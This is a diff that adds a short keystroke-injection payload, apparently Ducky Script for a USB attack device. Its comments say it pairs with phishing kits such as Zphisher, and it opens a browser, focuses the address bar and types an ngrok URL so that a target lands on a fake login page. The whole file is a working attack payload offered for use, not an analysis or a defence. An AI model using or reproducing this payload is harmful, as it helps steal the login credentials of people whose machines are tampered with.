@@ -1,0 +1,10 @@
+REM Can be used with phishing scripts like Zphisher to redirect targets to your fake login page
+REM You can use ngrok or similar services
+DELAY 300
+GUI b
+DELAY 300
+CTRL l
+DELAY 1000
+STRING http://7711dd0d.ngrok.io
+DELAY 1000
+ENTER
